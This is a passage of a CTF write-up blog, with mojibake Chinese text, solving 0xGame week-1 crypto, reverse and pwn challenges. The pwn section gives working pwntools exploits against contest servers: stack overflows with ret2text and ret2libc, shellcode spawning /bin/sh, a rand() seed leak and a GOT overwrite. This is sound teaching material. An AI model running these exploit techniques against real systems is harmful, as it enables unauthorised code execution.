class="number">512</span>)]</span><br><span class="line"><span class="comment">#print(len(pubkey))</span></span><br><span class="line"><span class="comment">#272</span></span><br><span class="line">nbit=<span class="number">512</span></span><br><span class="line"><span class="comment">#éšæœºæ‰¾ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„N</span></span><br><span class="line">N=nextprime(gmpy2.iroot(nbit,<span class="number">2</span>)[<span class="number">0</span>]//<span class="number">2</span>)</span><br><span class="line">L=Matrix(QQ,nbit + <span class="number">1</span>, nbit + <span class="number">1</span>)</span><br><span class="line"><span class="comment">#æ„é€ çŸ©é˜µL</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">    L[i,i]=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">    L[i,nbit]=pubkey[i]*N</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">    L[nbit,i]=<span class="number">1</span>/<span class="number">2</span></span><br><span class="line"></span><br><span class="line">L[nbit,nbit]=c*N</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;LLL start&quot;</span>)</span><br><span class="line">res=L.LLL()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">0</span>, nbit + <span class="number">1</span>)):</span><br><span class="line">    <span class="comment"># print solution</span></span><br><span class="line">    M = res.row(i).<span class="built_in">list</span>()[:-<span class="number">1</span>]<span class="comment">#æœ€åé¢å¯†æ–‡æ¢å¤åå˜æˆ0</span></span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> M:</span><br><span class="line">        <span class="keyword">if</span> m != <span class="number">1</span>/<span class="number">2</span> <span class="keyword">and</span> m != -<span class="number">1</span>/<span class="number">2</span>:<span class="comment">#æ ¹æ®ç ´è§£åŸç†ï¼Œæ¢å¤çš„æ˜æ–‡åº”åªåŒ…å«-1/2å’Œ1/2</span></span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        mm=<span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span> (i, M)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> M:</span><br><span class="line">            <span class="keyword">if</span> j==-<span class="number">1</span>/<span class="number">2</span>:<span class="comment">#ä¸ç¡®å®š-1/2å’Œ1/2å“ªä¸ªä»£è¡¨äºŒè¿›åˆ¶1</span></span><br><span class="line">                mm+=<span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                mm+=<span class="string">&quot;0&quot;</span></span><br><span class="line">flag=mm[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(flag,<span class="number">2</span>)))</span><br><span class="line"><span class="comment">#b&#x27;0xGame&#123;Welc0me_2_Crypt0_G@me!#$&amp;%&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="æ•°å­—ç­‘åŸº"><a href="#æ•°å­—ç­‘åŸº" class="headerlink" title="æ•°å­—ç­‘åŸº"></a>æ•°å­—ç­‘åŸº</h2><p>ida32æ‰“å¼€å³å¯åœ¨mainå‡½æ•°çœ‹åˆ°flagã€‚</p><p><img src="/0xGame-week1/r_1_1.png"></p><h2 id="ä»£ç é‡‘ä¸¹"><a href="#ä»£ç é‡‘ä¸¹" class="headerlink" title="ä»£ç é‡‘ä¸¹"></a>ä»£ç é‡‘ä¸¹</h2><p>åŒæ ·ida32æ‰“å¼€åœ¨mainå‡½æ•°çœ‹åˆ°flagã€‚</p><p><img src="/0xGame-week1/r_2_1.png"></p><h2 id="ç½‘ç»œå…ƒå©´"><a href="#ç½‘ç»œå…ƒå©´" class="headerlink" title="ç½‘ç»œå…ƒå©´"></a>ç½‘ç»œå…ƒå©´</h2><p>ida64æ‰“å¼€åœ¨mainå‡½æ•°çœ‹åˆ°flagã€‚</p><p><img src="/0xGame-week1/r_3_1.png"></p><h2 id="è™šæ‹ŸåŒ–ç¥"><a href="#è™šæ‹ŸåŒ–ç¥" class="headerlink" title="è™šæ‹ŸåŒ–ç¥"></a>è™šæ‹ŸåŒ–ç¥</h2><p>å…ˆè¿è¡Œä¸€æ¬¡ç¨‹åºï¼Œä¼šç”Ÿæˆä¸€ä¸ª<code>config.txt</code>çš„æ–‡ä»¶ï¼Œä¿®æ”¹<code>config.txt</code>çš„<code>0</code>ä¸º<code>1</code>ï¼Œå†è¿è¡Œä¸€æ¬¡å³å¯å¾—åˆ°flagã€‚</p><h2 id="èµ›åšå¤©å°Š"><a href="#èµ›åšå¤©å°Š" class="headerlink" title="èµ›åšå¤©å°Š"></a>èµ›åšå¤©å°Š</h2><p>ida64æ‰“å¼€ï¼ŒæŸ¥çœ‹mainå‡½æ•°ã€‚</p><p><img src="/0xGame-week1/r_5_1.png"></p><p>å¾ˆæ˜¾ç„¶éœ€è¦ç”¨z3æ¥è§£æ–¹ç¨‹ã€‚</p><p>å…ˆå®‰è£…z3ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install pip install z3_solver</span><br></pre></td></tr></table></figure><p>ä¹‹åå°±å†™è„šæœ¬è§£æ–¹ç¨‹ï¼Œå°†å¾—åˆ°çš„ç»“æœæ‹¼æ¥èµ·æ¥ï¼Œå¾—åˆ°flagã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">v7, v8, v9, v10, v11 = Ints(<span class="string">&#x27;v7 v8 v9 v10 v11&#x27;</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(<span class="number">7</span> * v9 + <span class="number">5</span> * (v8 + v11) + <span class="number">2</span> * (v10 + <span class="number">4</span> * v7) == <span class="number">0x12021DE669FC2</span>)</span><br><span class="line">s.add(v8 + <span class="number">2</span> * (v9 + v10 + <span class="number">2</span> * v10 + <span class="number">2</span> * (v11 + v7)) + (v9 + v10 + <span class="number">2</span> * v10 + <span class="number">2</span> * (v11 + v7)) == <span class="number">0x159BFFC17D045</span>)</span><br><span class="line">s.add(v10 + v9 + v11 + <span class="number">2</span> * v9 + <span class="number">2</span> * (v9 + v11 + <span class="number">2</span> * v9) + <span class="number">2</span> * (v8 + <span class="number">4</span> * v7) == <span class="number">0xACE320D12501</span>)</span><br><span class="line">s.add(v8 + <span class="number">2</span> * (v7 + v11 + v9 + <span class="number">2</span> * v10) == <span class="number">0x733FFEB3A4FA</span>)</span><br><span class="line">s.add(v8 + <span class="number">7</span> * v11 + <span class="number">8</span> * (v9 + v10) + <span class="number">5</span> * v7 == <span class="number">0x1935EBA54EB28</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[v11 = 63356652901730,</span></span><br><span class="line"><span class="string"> v7 = 2693650760,</span></span><br><span class="line"><span class="string"> v10 = 41791,</span></span><br><span class="line"><span class="string"> v9 = 16488,</span></span><br><span class="line"><span class="string"> v8 = 14810]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">v11 = <span class="number">63356652901730</span></span><br><span class="line">v7 = <span class="number">2693650760</span></span><br><span class="line">v10 = <span class="number">41791</span></span><br><span class="line">v9 = <span class="number">16488</span></span><br><span class="line">v8 = <span class="number">14810</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;0xGame&#123;&quot;</span>+<span class="built_in">hex</span>(v7)[<span class="number">2</span>:]+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">hex</span>(v8)[<span class="number">2</span>:]+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">hex</span>(v9)[<span class="number">2</span>:]+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">hex</span>(v10)[<span class="number">2</span>:]+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">hex</span>(v11)[<span class="number">2</span>:]+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#0xGame&#123;a08dd948-39da-4068-a33f-399f5eca5562&#125;</span></span><br></pre></td></tr></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="æ‰¾ä¸åˆ°ä¸”ä¸å¯¹åŠ²çš„flag"><a href="#æ‰¾ä¸åˆ°ä¸”ä¸å¯¹åŠ²çš„flag" class="headerlink" title="æ‰¾ä¸åˆ°ä¸”ä¸å¯¹åŠ²çš„flag"></a>æ‰¾ä¸åˆ°ä¸”ä¸å¯¹åŠ²çš„flag</h2><p>nc è¿æ¥ï¼Œç„¶å<code>ls -la</code>ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª<code>.secret</code>çš„æ–‡ä»¶å¤¹ï¼Œflagå°±åœ¨é‚£ä¸ªæ–‡ä»¶å¤¹é‡Œã€‚</p><h2 id="æ°¸è¿œè¿›ä¸å»çš„åé—¨"><a href="#æ°¸è¿œè¿›ä¸å»çš„åé—¨" class="headerlink" title="æ°¸è¿œè¿›ä¸å»çš„åé—¨"></a>æ°¸è¿œè¿›ä¸å»çš„åé—¨</h2><p>ç®€å•çš„æ ˆæº¢å‡ºï¼Œæ‰¾åˆ°åé—¨çš„åœ°å€ç›´æ¥è·³è¿‡å»å°±è¡Œäº†ã€‚</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#sh = process(&#x27;./ret2text&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;8.130.35.16&#x27;</span>, <span class="number">51002</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0x401298</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Tell me sth interesting, and I will give you what you want.\n&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="éšä¾¿ä¹±æçš„shellcode"><a href="#éšä¾¿ä¹±æçš„shellcode" class="headerlink" title="éšä¾¿ä¹±æçš„shellcode"></a>éšä¾¿ä¹±æçš„shellcode</h2><p><img src="/0xGame-week1/p_1_1.png"></p><p>æ²¡æœ‰åé—¨å‡½æ•°ï¼Œç¨‹åºä¼šå°†<code>buf[rand()%256]</code>çš„éƒ¨åˆ†å½“æˆä»£ç æ‰§è¡Œï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ§åˆ¶shellcodeåœ¨è¿™é‡Œã€‚</p><p>æœ‰<code>close(1);</code>ï¼Œæ‰€ä»¥è¦æ¥ä¸Šä¸€ä¸ª<code>exec 1&gt;&amp;0</code></p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#cal =  process(&#x27;./ret2shellcode&#x27;)</span></span><br><span class="line">cal = remote(<span class="string">&#x27;8.130.35.16&#x27;</span>, <span class="number">51003</span>)</span><br><span class="line">elf = cdll.LoadLibrary(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">elf.srand(<span class="built_in">int</span>(time.time()))</span><br><span class="line">off = elf.rand()</span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(off%<span class="number">256</span>) + sc</span><br><span class="line">cal.sendlineafter(<span class="string">b&quot;code:&quot;</span>,payload)</span><br><span class="line">cal.sendline(<span class="string">b&#x27;exec 1&gt;&amp;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cal.interactive()</span><br></pre></td></tr></table></figure><p><img src="/0xGame-week1/p_1_2.png"></p><h2 id="æˆ‘åé—¨å‘¢ï¼Ÿ"><a href="#æˆ‘åé—¨å‘¢ï¼Ÿ" class="headerlink" title="æˆ‘åé—¨å‘¢ï¼Ÿ"></a>æˆ‘åé—¨å‘¢ï¼Ÿ</h2><p>å‚è€ƒé“¾æ¥ï¼š</p><ol><li><a href="https://blog.csdn.net/weixin_45943522/article/details/120469196">https://blog.csdn.net/weixin_45943522/article/details/120469196</a></li><li><a href="https://blog.csdn.net/Mintind/article/details/128165311">https://blog.csdn.net/Mintind/article/details/128165311</a></li><li><a href="https://libc.blukat.me/">https://libc.blukat.me/</a></li></ol><p>ç”¨<code>ROPgadget</code>æ‰¾<code>rid</code>å’Œ<code>ret</code>çš„åœ°å€ã€‚</p><p><img src="/0xGame-week1/p_2_2.png"></p><p>æ³„éœ²å‡º<code>puts</code>çš„åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./ret2libc&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;8.130.35.16&#x27;</span>, <span class="number">51005</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401333</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span> + <span class="number">7</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input:\n&#x27;</span>, payload1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvline())  <span class="comment">#p.recvuntil(&#x27;\x0a&#x27;)</span></span><br><span class="line">puts_addr = p.recv(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(puts_addr)</span><br><span class="line">puts_addr = puts_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(puts_addr)</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line"><span class="comment">#puts_addr = u64(p.recv(6).ljust(8, b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(puts_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># 0x7f79a6363420</span></span><br></pre></td></tr></table></figure><p>ç„¶åç”¨ <code>libc database search</code> æ‰¾ <code>system</code> å’Œ <code>/bin/sh</code> çš„åœ°å€ã€‚</p><p><img src="/0xGame-week1/p_2_1.png"></p><p>æœ€åç”¨<code>puts</code>ç®—å‡ºåŸºåœ°å€ï¼Œåœ¨ç¬¬äºŒæ¬¡æ ˆæº¢å‡ºæ—¶<code>getshell</code>ã€‚</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./ret2libc&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;8.130.35.16&#x27;</span>, <span class="number">51005</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401333</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span> + <span class="number">7</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input:\n&#x27;</span>, payload1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvline())  <span class="comment">#p.recvuntil(&#x27;\x0a&#x27;)</span></span><br><span class="line">puts_addr = p.recv(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(puts_addr)</span><br><span class="line">puts_addr = puts_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(puts_addr)</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line"><span class="comment">#puts_addr = u64(p.recv(6).ljust(8, b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(puts_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys_offset = <span class="number">0x052290</span></span><br><span class="line">puts_offset = <span class="number">0x084420</span></span><br><span class="line">sh_offset = <span class="number">0x1b45bd</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line">binsh = libc_base + sh_offset</span><br><span class="line">system = libc_base + sys_offset</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>-<span class="number">1</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="é«˜ç«¯çš„syscall"><a href="#é«˜ç«¯çš„syscall" class="headerlink" title="é«˜ç«¯çš„syscall"></a>é«˜ç«¯çš„syscall</h2><p>åŒæ ·æ‹¿<code>ret2libc</code>æ‰“çš„ã€‚</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./ret2syscall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;8.130.35.16&#x27;</span>, <span class="number">51004</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2syscall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4012e3</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span> + <span class="number">8</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input: \n&#x27;</span>, payload1)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">sys_offset = <span class="number">0x052290</span></span><br><span class="line">puts_offset = <span class="number">0x084420</span></span><br><span class="line">sh_offset = <span class="number">0x1b45bd</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line">binsh = libc_base + sh_offset</span><br><span class="line">system = libc_base + sys_offset</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">0x8</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input: \n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="å­—ç¬¦ä¸²å’Œéšæœºæ•°"><a href="#å­—ç¬¦ä¸²å’Œéšæœºæ•°" class="headerlink" title="å­—ç¬¦ä¸²å’Œéšæœºæ•°"></a>å­—ç¬¦ä¸²å’Œéšæœºæ•°</h2><p><img src="/0xGame-week1/p_3_1.png"></p><ol><li>é€šè¿‡å°†<code>name</code>å¡«å……æ»¡ï¼ŒæŠŠ<code>seed</code>æ³„éœ²å‡ºæ¥ã€‚</li><li><code>pass</code>éœ€è¦ä»¥<code>\x00</code>ç»“å°¾ã€‚</li><li>æ³„éœ²å‡º<code>seed</code>åè¦å…ˆæŠŠ<code>seed</code>é€†åºï¼Œå†è½¬æˆ10è¿›åˆ¶æ•°ã€‚ï¼ˆè¸©åˆ°çš„å‘ï¼‰</li></ol><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;8.130.35.16&#x27;, 51001)</span></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf=cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Name: &#x27;</span>,<span class="string">&quot;adminaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Password: &#x27;</span>,<span class="string">&quot;1s_7h1s_p9ss_7tuIy_sAf3?\x00&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome back, adminaaaaaaaaaaaaaaaaaaaaaaaaaa\n&#x27;</span>)</span><br><span class="line">a = p.recv(<span class="number">4</span>)[::-<span class="number">1</span>]</span><br><span class="line">seed = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">aa = <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(aa)==<span class="number">1</span>:</span><br><span class="line">aa=<span class="string">&#x27;0&#x27;</span>+aa</span><br><span class="line">seed +=aa</span><br><span class="line"><span class="built_in">print</span>(seed)</span><br><span class="line">seed = <span class="built_in">int</span>(seed,<span class="number">16</span>)</span><br><span class="line">elf.srand(seed)</span><br><span class="line">v3 = elf.rand() </span><br><span class="line">v2 = elf.rand() </span><br><span class="line">v3 = v3 ^ <span class="number">0xD0E0A0D0</span></span><br><span class="line">v2 = v2 ^ <span class="number">0xB0E0E0F</span></span><br><span class="line">v1 = (v3^v2)%<span class="number">0xF4240</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Wanna see it?&#x27;</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;continue: &#x27;</span>,<span class="built_in">str</span>(v1))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="got-it"><a href="#got-it" class="headerlink" title="got-it"></a>got-it</h2><p>æ•°ç»„æº¢å‡ºä¿®æ”¹gotè¡¨ã€‚</p><p><img src="/0xGame-week1/p_4_1.png"></p><p><img src="/0xGame-week1/p_4_2.png"></p><p><img src="/0xGame-week1/p_4_3.png"></p><p><img src="/0xGame-week1/p_4_4.png"></p><p>æ€è·¯ï¼šä¿®æ”¹gotè¡¨ï¼Œå°†<code>exit</code>çš„åœ°å€æ”¹æˆ<code>system</code>çš„åœ°å€ï¼Œä¹‹åè®©v3&#x3D;&#x3D;8227ï¼Œå³å¯getshellã€‚</p><p>å…ˆæ³„éœ²å‡º<code>puts</code>çš„åœ°å€ã€‚é€šè¿‡idaå¯ä»¥çœ‹åˆ°ï¼Œlistæ•°ç»„çš„åœ°å€ä¸º<code>0x4040A0</code>ï¼Œ<code>exit</code>çš„åœ°å€ä¸º<code>0x404048</code>ï¼Œ<code>puts</code>çš„åœ°å€ä¸º<code>0x404018</code>ã€‚</p><p><img src="/0xGame-week1/p_4_5.png"></p><p>é€šè¿‡è®¡ç®—ï¼Œ<code>(0x4040A0 - 0x404018)/8 = 17</code>ï¼Œ<code>(0x4040A0 - 0x404048)/8 = 11</code> ã€‚æ ¹æ®è¿™äº›ï¼Œå¯ä»¥ç›´æ¥è¯»<code>list[-17]</code>æŠŠ<code>puts</code>çš„çœŸå®åœ°å€è¯»å‡ºæ¥ï¼Œç„¶åå»ç®—å‡º<code>libc</code>çš„åŸºåœ°å€ï¼Œå†æ ¹æ®åŸºåœ°å€ç®—å‡º<code>system</code>çš„çœŸå®åœ°å€ï¼Œä¹‹ååœ¨<code>list[-11]</code>å¤„å°†<code>exit</code>çš„åœ°å€æ”¹æˆ<code>system</code>çš„åœ°å€ã€‚</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./got-it&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;8.130.35.16&#x27;</span>, <span class="number">51006</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./got-it&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input student id:&#x27;</span>,<span class="string">&#x27;-17&#x27;</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">sys_offset = <span class="number">0x052290</span></span><br><span class="line">puts_offset = <span class="number">0x084420</span></span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line">system = libc_base + sys_offset</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input student id:&#x27;</span>,<span class="string">&#x27;-11&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Input student name:&#x27;</span>,p64(system))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;8227&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/0xGame-week1/p_4_6.png"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p>å…ˆbase64è§£ç 